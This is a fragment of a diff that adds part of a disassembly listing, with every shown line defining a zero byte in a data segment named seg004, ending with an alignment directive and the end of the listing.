+seg004:004031D0			db    0	;  
+seg004:004031D1			db    0	;  
+seg004:004031D2			db    0	;  
+seg004:004031D3			db    0	;  
+seg004:004031D4			db    0	;  
+seg004:004031D5			db    0	;  
+seg004:004031D6			db    0	;  
+seg004:004031D7			db    0	;  
+seg004:004031D8			db    0	;  
+seg004:004031D9			db    0	;  
+seg004:004031DA			db    0	;  
+seg004:004031DB			db    0	;  
+seg004:004031DC			db    0	;  
+seg004:004031DD			db    0	;  
+seg004:004031DE			db    0	;  
+seg004:004031DF			db    0	;  
+seg004:004031E0			db    0	;  
+seg004:004031E1			db    0	;  
+seg004:004031E2			db    0	;  
+seg004:004031E3			db    0	;  
+seg004:004031E4			db    0	;  
+seg004:004031E5			db    0	;  
+seg004:004031E6			db    0	;  
+seg004:004031E7			db    0	;  
+seg004:004031E8			db    0	;  
+seg004:004031E9			db    0	;  
+seg004:004031EA			db    0	;  
+seg004:004031EB			db    0	;  
+seg004:004031EC			db    0	;  
+seg004:004031ED			db    0	;  
+seg004:004031EE			db    0	;  
+seg004:004031EF			db    0	;  
+seg004:004031F0			db    0	;  
+seg004:004031F1			db    0	;  
+seg004:004031F2			db    0	;  
+seg004:004031F3			db    0	;  
+seg004:004031F4			db    0	;  
+seg004:004031F5			db    0	;  
+seg004:004031F6			db    0	;  
+seg004:004031F7			db    0	;  
+seg004:004031F8			db    0	;  
+seg004:004031F9			db    0	;  
+seg004:004031FA			db    0	;  
+seg004:004031FB			db    0	;  
+seg004:004031FC			db    0	;  
+seg004:004031FD			db    0	;  
+seg004:004031FE			db    0	;  
+seg004:004031FF			db    0	;  
+seg004:00403200			db    0	;  
+seg004:00403201			db    0	;  
+seg004:00403202			db    0	;  
+seg004:00403203			db    0	;  
+seg004:00403204			db    0	;  
+seg004:00403205			db    0	;  
+seg004:00403206			db    0	;  
+seg004:00403207			db    0	;  
+seg004:00403208			db    0	;  
+seg004:00403209			db    0	;  
+seg004:0040320A			db    0	;  
+seg004:0040320B			db    0	;  
+seg004:0040320C			db    0	;  
+seg004:0040320D			db    0	;  
+seg004:0040320E			db    0	;  
+seg004:0040320F			db    0	;  
+seg004:00403210			db    0	;  
+seg004:00403211			db    0	;  
+seg004:00403212			db    0	;  
+seg004:00403213			db    0	;  
+seg004:00403214			db    0	;  
+seg004:00403215			db    0	;  
+seg004:00403216			db    0	;  
+seg004:00403217			db    0	;  
+seg004:00403218			db    0	;  
+seg004:00403219			db    0	;  
+seg004:0040321A			db    0	;  
+seg004:0040321B			db    0	;  
+seg004:0040321C			db    0	;  
+seg004:0040321D			db    0	;  
+seg004:0040321E			db    0	;  
+seg004:0040321F			db    0	;  
+seg004:00403220			db    0	;  
+seg004:00403221			db    0	;  
+seg004:00403222			db    0	;  
+seg004:00403223			db    0	;  
+seg004:00403224			db    0	;  
+seg004:00403225			db    0	;  
+seg004:00403226			db    0	;  
+seg004:00403227			db    0	;  
+seg004:00403228			db    0	;  
+seg004:00403229			db    0	;  
+seg004:0040322A			db    0	;  
+seg004:0040322B			db    0	;  
+seg004:0040322C			db    0	;  
+seg004:0040322D			db    0	;  
+seg004:0040322E			db    0	;  
+seg004:0040322F			db    0	;  
+seg004:00403230			db    0	;  
+seg004:00403231			db    0	;  
+seg004:00403232			db    0	;  
+seg004:00403233			db    0	;  
+seg004:00403234			db    0	;  
+seg004:00403235			db    0	;  
+seg004:00403236			db    0	;  
+seg004:00403237			db    0	;  
+seg004:00403238			db    0	;  
+seg004:00403239			db    0	;  
+seg004:0040323A			db    0	;  
+seg004:0040323B			db    0	;  
+seg004:0040323C			db    0	;  
+seg004:0040323D			db    0	;  
+seg004:0040323E			db    0	;  
+seg004:0040323F			db    0	;  
+seg004:00403240			db    0	;  
+seg004:00403241			db    0	;  
+seg004:00403242			db    0	;  
+seg004:00403243			db    0	;  
+seg004:00403244			db    0	;  
+seg004:00403245			db    0	;  
+seg004:00403246			db    0	;  
+seg004:00403247			db    0	;  
+seg004:00403248			db    0	;  
+seg004:00403249			db    0	;  
+seg004:0040324A			db    0	;  
+seg004:0040324B			db    0	;  
+seg004:0040324C			db    0	;  
+seg004:0040324D			db    0	;  
+seg004:0040324E			db    0	;  
+seg004:0040324F			db    0	;  
+seg004:00403250			db    0	;  
+seg004:00403251			db    0	;  
+seg004:00403252			db    0	;  
+seg004:00403253			db    0	;  
+seg004:00403254			db    0	;  
+seg004:00403255			db    0	;  
+seg004:00403256			db    0	;  
+seg004:00403257			db    0	;  
+seg004:00403258			db    0	;  
+seg004:00403259			db    0	;  
+seg004:0040325A			db    0	;  
+seg004:0040325B			db    0	;  
+seg004:0040325C			db    0	;  
+seg004:0040325D			db    0	;  
+seg004:0040325E			db    0	;  
+seg004:0040325F			db    0	;  
+seg004:00403260			db    0	;  
+seg004:00403261			db    0	;  
+seg004:00403262			db    0	;  
+seg004:00403263			db    0	;  
+seg004:00403264			db    0	;  
+seg004:00403265			db    0	;  
+seg004:00403266			db    0	;  
+seg004:00403267			db    0	;  
+seg004:00403268			db    0	;  
+seg004:00403269			db    0	;  
+seg004:0040326A			db    0	;  
+seg004:0040326B			db    0	;  
+seg004:0040326C			db    0	;  
+seg004:0040326D			db    0	;  
+seg004:0040326E			db    0	;  
+seg004:0040326F			db    0	;  
+seg004:00403270			db    0	;  
+seg004:00403271			db    0	;  
+seg004:00403272			db    0	;  
+seg004:00403273			db    0	;  
+seg004:00403274			db    0	;  
+seg004:00403275			db    0	;  
+seg004:00403276			db    0	;  
+seg004:00403277			db    0	;  
+seg004:00403278			db    0	;  
+seg004:00403279			db    0	;  
+seg004:0040327A			db    0	;  
+seg004:0040327B			db    0	;  
+seg004:0040327C			db    0	;  
+seg004:0040327D			db    0	;  
+seg004:0040327E			db    0	;  
+seg004:0040327F			db    0	;  
+seg004:00403280			db    0	;  
+seg004:00403281			db    0	;  
+seg004:00403282			db    0	;  
+seg004:00403283			db    0	;  
+seg004:00403284			db    0	;  
+seg004:00403285			db    0	;  
+seg004:00403286			db    0	;  
+seg004:00403287			db    0	;  
+seg004:00403288			db    0	;  
+seg004:00403289			db    0	;  
+seg004:0040328A			db    0	;  
+seg004:0040328B			db    0	;  
+seg004:0040328C			db    0	;  
+seg004:0040328D			db    0	;  
+seg004:0040328E			db    0	;  
+seg004:0040328F			db    0	;  
+seg004:00403290			db    0	;  
+seg004:00403291			db    0	;  
+seg004:00403292			db    0	;  
+seg004:00403293			db    0	;  
+seg004:00403294			db    0	;  
+seg004:00403295			db    0	;  
+seg004:00403296			db    0	;  
+seg004:00403297			db    0	;  
+seg004:00403298			db    0	;  
+seg004:00403299			db    0	;  
+seg004:0040329A			db    0	;  
+seg004:0040329B			db    0	;  
+seg004:0040329C			db    0	;  
+seg004:0040329D			db    0	;  
+seg004:0040329E			db    0	;  
+seg004:0040329F			db    0	;  
+seg004:004032A0			db    0	;  
+seg004:004032A1			db    0	;  
+seg004:004032A2			db    0	;  
+seg004:004032A3			db    0	;  
+seg004:004032A4			db    0	;  
+seg004:004032A5			db    0	;  
+seg004:004032A6			db    0	;  
+seg004:004032A7			db    0	;  
+seg004:004032A8			db    0	;  
+seg004:004032A9			db    0	;  
+seg004:004032AA			db    0	;  
+seg004:004032AB			db    0	;  
+seg004:004032AC			db    0	;  
+seg004:004032AD			db    0	;  
+seg004:004032AE			db    0	;  
+seg004:004032AF			db    0	;  
+seg004:004032B0			db    0	;  
+seg004:004032B1			db    0	;  
+seg004:004032B2			db    0	;  
+seg004:004032B3			db    0	;  
+seg004:004032B4			db    0	;  
+seg004:004032B5			db    0	;  
+seg004:004032B6			db    0	;  
+seg004:004032B7			db    0	;  
+seg004:004032B8			db    0	;  
+seg004:004032B9			db    0	;  
+seg004:004032BA			db    0	;  
+seg004:004032BB			db    0	;  
+seg004:004032BC			db    0	;  
+seg004:004032BD			db    0	;  
+seg004:004032BE			db    0	;  
+seg004:004032BF			db    0	;  
+seg004:004032C0			db    0	;  
+seg004:004032C1			db    0	;  
+seg004:004032C2			db    0	;  
+seg004:004032C3			db    0	;  
+seg004:004032C4			db    0	;  
+seg004:004032C5			db    0	;  
+seg004:004032C6			db    0	;  
+seg004:004032C7			db    0	;  
+seg004:004032C8			db    0	;  
+seg004:004032C9			db    0	;  
+seg004:004032CA			db    0	;  
+seg004:004032CB			db    0	;  
+seg004:004032CC			db    0	;  
+seg004:004032CD			db    0	;  
+seg004:004032CE			db    0	;  
+seg004:004032CF			db    0	;  
+seg004:004032D0			db    0	;  
+seg004:004032D1			db    0	;  
+seg004:004032D2			db    0	;  
+seg004:004032D3			db    0	;  
+seg004:004032D4			db    0	;  
+seg004:004032D5			db    0	;  
+seg004:004032D6			db    0	;  
+seg004:004032D7			db    0	;  
+seg004:004032D8			db    0	;  
+seg004:004032D9			db    0	;  
+seg004:004032DA			db    0	;  
+seg004:004032DB			db    0	;  
+seg004:004032DC			db    0	;  
+seg004:004032DD			db    0	;  
+seg004:004032DE			db    0	;  
+seg004:004032DF			db    0	;  
+seg004:004032E0			db    0	;  
+seg004:004032E1			db    0	;  
+seg004:004032E2			db    0	;  
+seg004:004032E3			db    0	;  
+seg004:004032E4			db    0	;  
+seg004:004032E5			db    0	;  
+seg004:004032E6			db    0	;  
+seg004:004032E7			db    0	;  
+seg004:004032E8			db    0	;  
+seg004:004032E9			db    0	;  
+seg004:004032EA			db    0	;  
+seg004:004032EB			db    0	;  
+seg004:004032EC			db    0	;  
+seg004:004032ED			db    0	;  
+seg004:004032EE			db    0	;  
+seg004:004032EF			db    0	;  
+seg004:004032F0			db    0	;  
+seg004:004032F1			db    0	;  
+seg004:004032F2			db    0	;  
+seg004:004032F3			db    0	;  
+seg004:004032F4			db    0	;  
+seg004:004032F5			db    0	;  
+seg004:004032F6			db    0	;  
+seg004:004032F7			db    0	;  
+seg004:004032F8			db    0	;  
+seg004:004032F9			db    0	;  
+seg004:004032FA			db    0	;  
+seg004:004032FB			db    0	;  
+seg004:004032FC			db    0	;  
+seg004:004032FD			db    0	;  
+seg004:004032FE			db    0	;  
+seg004:004032FF			db    0	;  
+seg004:00403300			db    0	;  
+seg004:00403301			db    0	;  
+seg004:00403302			db    0	;  
+seg004:00403303			db    0	;  
+seg004:00403304			db    0	;  
+seg004:00403305			db    0	;  
+seg004:00403306			db    0	;  
+seg004:00403307			db    0	;  
+seg004:00403308			db    0	;  
+seg004:00403309			db    0	;  
+seg004:0040330A			db    0	;  
+seg004:0040330B			db    0	;  
+seg004:0040330C			db    0	;  
+seg004:0040330D			db    0	;  
+seg004:0040330E			db    0	;  
+seg004:0040330F			db    0	;  
+seg004:00403310			db    0	;  
+seg004:00403311			db    0	;  
+seg004:00403312			db    0	;  
+seg004:00403313			db    0	;  
+seg004:00403314			db    0	;  
+seg004:00403315			db    0	;  
+seg004:00403316			db    0	;  
+seg004:00403317			db    0	;  
+seg004:00403318			db    0	;  
+seg004:00403319			db    0	;  
+seg004:0040331A			db    0	;  
+seg004:0040331B			db    0	;  
+seg004:0040331C			db    0	;  
+seg004:0040331D			db    0	;  
+seg004:0040331E			db    0	;  
+seg004:0040331F			db    0	;  
+seg004:00403320			db    0	;  
+seg004:00403321			db    0	;  
+seg004:00403322			db    0	;  
+seg004:00403323			db    0	;  
+seg004:00403324			db    0	;  
+seg004:00403325			db    0	;  
+seg004:00403326			db    0	;  
+seg004:00403327			db    0	;  
+seg004:00403328			db    0	;  
+seg004:00403329			db    0	;  
+seg004:0040332A			db    0	;  
+seg004:0040332B			db    0	;  
+seg004:0040332C			db    0	;  
+seg004:0040332D			db    0	;  
+seg004:0040332E			db    0	;  
+seg004:0040332F			db    0	;  
+seg004:00403330			db    0	;  
+seg004:00403331			db    0	;  
+seg004:00403332			db    0	;  
+seg004:00403333			db    0	;  
+seg004:00403334			db    0	;  
+seg004:00403335			db    0	;  
+seg004:00403336			db    0	;  
+seg004:00403337			db    0	;  
+seg004:00403338			db    0	;  
+seg004:00403339			db    0	;  
+seg004:0040333A			db    0	;  
+seg004:0040333B			db    0	;  
+seg004:0040333C			db    0	;  
+seg004:0040333D			db    0	;  
+seg004:0040333E			db    0	;  
+seg004:0040333F			db    0	;  
+seg004:00403340			db    0	;  
+seg004:00403341			db    0	;  
+seg004:00403342			db    0	;  
+seg004:00403343			db    0	;  
+seg004:00403344			db    0	;  
+seg004:00403345			db    0	;  
+seg004:00403346			db    0	;  
+seg004:00403347			db    0	;  
+seg004:00403348			db    0	;  
+seg004:00403349			db    0	;  
+seg004:0040334A			db    0	;  
+seg004:0040334B			db    0	;  
+seg004:0040334C			db    0	;  
+seg004:0040334D			db    0	;  
+seg004:0040334E			db    0	;  
+seg004:0040334F			db    0	;  
+seg004:00403350			db    0	;  
+seg004:00403351			db    0	;  
+seg004:00403352			db    0	;  
+seg004:00403353			db    0	;  
+seg004:00403354			db    0	;  
+seg004:00403355			db    0	;  
+seg004:00403356			db    0	;  
+seg004:00403357			db    0	;  
+seg004:00403358			db    0	;  
+seg004:00403359			db    0	;  
+seg004:0040335A			db    0	;  
+seg004:0040335B			db    0	;  
+seg004:0040335C			db    0	;  
+seg004:0040335D			db    0	;  
+seg004:0040335E			db    0	;  
+seg004:0040335F			db    0	;  
+seg004:00403360			db    0	;  
+seg004:00403361			db    0	;  
+seg004:00403362			db    0	;  
+seg004:00403363			db    0	;  
+seg004:00403364			db    0	;  
+seg004:00403365			db    0	;  
+seg004:00403366			db    0	;  
+seg004:00403367			db    0	;  
+seg004:00403368			db    0	;  
+seg004:00403369			db    0	;  
+seg004:0040336A			db    0	;  
+seg004:0040336B			db    0	;  
+seg004:0040336C			db    0	;  
+seg004:0040336D			db    0	;  
+seg004:0040336E			db    0	;  
+seg004:0040336F			db    0	;  
+seg004:00403370			db    0	;  
+seg004:00403371			db    0	;  
+seg004:00403372			db    0	;  
+seg004:00403373			db    0	;  
+seg004:00403374			db    0	;  
+seg004:00403375			db    0	;  
+seg004:00403376			db    0	;  
+seg004:00403377			db    0	;  
+seg004:00403378			db    0	;  
+seg004:00403379			db    0	;  
+seg004:0040337A			db    0	;  
+seg004:0040337B			db    0	;  
+seg004:0040337C			db    0	;  
+seg004:0040337D			db    0	;  
+seg004:0040337E			db    0	;  
+seg004:0040337F			db    0	;  
+seg004:00403380			db    0	;  
+seg004:00403381			db    0	;  
+seg004:00403382			db    0	;  
+seg004:00403383			db    0	;  
+seg004:00403384			db    0	;  
+seg004:00403385			db    0	;  
+seg004:00403386			db    0	;  
+seg004:00403387			db    0	;  
+seg004:00403388			db    0	;  
+seg004:00403389			db    0	;  
+seg004:0040338A			db    0	;  
+seg004:0040338B			db    0	;  
+seg004:0040338C			db    0	;  
+seg004:0040338D			db    0	;  
+seg004:0040338E			db    0	;  
+seg004:0040338F			db    0	;  
+seg004:00403390			db    0	;  
+seg004:00403391			db    0	;  
+seg004:00403392			db    0	;  
+seg004:00403393			db    0	;  
+seg004:00403394			db    0	;  
+seg004:00403395			db    0	;  
+seg004:00403396			db    0	;  
+seg004:00403397			db    0	;  
+seg004:00403398			db    0	;  
+seg004:00403399			db    0	;  
+seg004:0040339A			db    0	;  
+seg004:0040339B			db    0	;  
+seg004:0040339C			db    0	;  
+seg004:0040339D			db    0	;  
+seg004:0040339E			db    0	;  
+seg004:0040339F			db    0	;  
+seg004:004033A0			db    0	;  
+seg004:004033A1			db    0	;  
+seg004:004033A2			db    0	;  
+seg004:004033A3			db    0	;  
+seg004:004033A4			db    0	;  
+seg004:004033A5			db    0	;  
+seg004:004033A6			db    0	;  
+seg004:004033A7			db    0	;  
+seg004:004033A8			db    0	;  
+seg004:004033A9			db    0	;  
+seg004:004033AA			db    0	;  
+seg004:004033AB			db    0	;  
+seg004:004033AC			db    0	;  
+seg004:004033AD			db    0	;  
+seg004:004033AE			db    0	;  
+seg004:004033AF			db    0	;  
+seg004:004033B0			db    0	;  
+seg004:004033B1			db    0	;  
+seg004:004033B2			db    0	;  
+seg004:004033B3			db    0	;  
+seg004:004033B4			db    0	;  
+seg004:004033B5			db    0	;  
+seg004:004033B6			db    0	;  
+seg004:004033B7			db    0	;  
+seg004:004033B8			db    0	;  
+seg004:004033B9			db    0	;  
+seg004:004033BA			db    0	;  
+seg004:004033BB			db    0	;  
+seg004:004033BC			db    0	;  
+seg004:004033BD			db    0	;  
+seg004:004033BE			db    0	;  
+seg004:004033BF			db    0	;  
+seg004:004033C0			db    0	;  
+seg004:004033C1			db    0	;  
+seg004:004033C2			db    0	;  
+seg004:004033C3			db    0	;  
+seg004:004033C4			db    0	;  
+seg004:004033C5			db    0	;  
+seg004:004033C6			db    0	;  
+seg004:004033C7			db    0	;  
+seg004:004033C8			db    0	;  
+seg004:004033C9			db    0	;  
+seg004:004033CA			db    0	;  
+seg004:004033CB			db    0	;  
+seg004:004033CC			db    0	;  
+seg004:004033CD			db    0	;  
+seg004:004033CE			db    0	;  
+seg004:004033CF			db    0	;  
+seg004:004033D0			db    0	;  
+seg004:004033D1			db    0	;  
+seg004:004033D2			db    0	;  
+seg004:004033D3			db    0	;  
+seg004:004033D4			db    0	;  
+seg004:004033D5			db    0	;  
+seg004:004033D6			db    0	;  
+seg004:004033D7			db    0	;  
+seg004:004033D8			db    0	;  
+seg004:004033D9			db    0	;  
+seg004:004033DA			db    0	;  
+seg004:004033DB			db    0	;  
+seg004:004033DC			db    0	;  
+seg004:004033DD			db    0	;  
+seg004:004033DE			db    0	;  
+seg004:004033DF			db    0	;  
+seg004:004033E0			db    0	;  
+seg004:004033E1			db    0	;  
+seg004:004033E2			db    0	;  
+seg004:004033E3			db    0	;  
+seg004:004033E4			db    0	;  
+seg004:004033E5			db    0	;  
+seg004:004033E6			db    0	;  
+seg004:004033E7			db    0	;  
+seg004:004033E8			db    0	;  
+seg004:004033E9			db    0	;  
+seg004:004033EA			db    0	;  
+seg004:004033EB			db    0	;  
+seg004:004033EC			db    0	;  
+seg004:004033ED			db    0	;  
+seg004:004033EE			db    0	;  
+seg004:004033EF			db    0	;  
+seg004:004033F0			db    0	;  
+seg004:004033F1			db    0	;  
+seg004:004033F2			db    0	;  
+seg004:004033F3			db    0	;  
+seg004:004033F4			db    0	;  
+seg004:004033F5			db    0	;  
+seg004:004033F6			db    0	;  
+seg004:004033F7			db    0	;  
+seg004:004033F8			db    0	;  
+seg004:004033F9			db    0	;  
+seg004:004033FA			db    0	;  
+seg004:004033FB			db    0	;  
+seg004:004033FC			db    0	;  
+seg004:004033FD			db    0	;  
+seg004:004033FE			db    0	;  
+seg004:004033FF			db    0	;  
+seg004:00403400			align 1000h
+seg004:00403400	seg004		ends
+seg004:00403400	
+seg004:00403400	
+seg004:00403400			end start
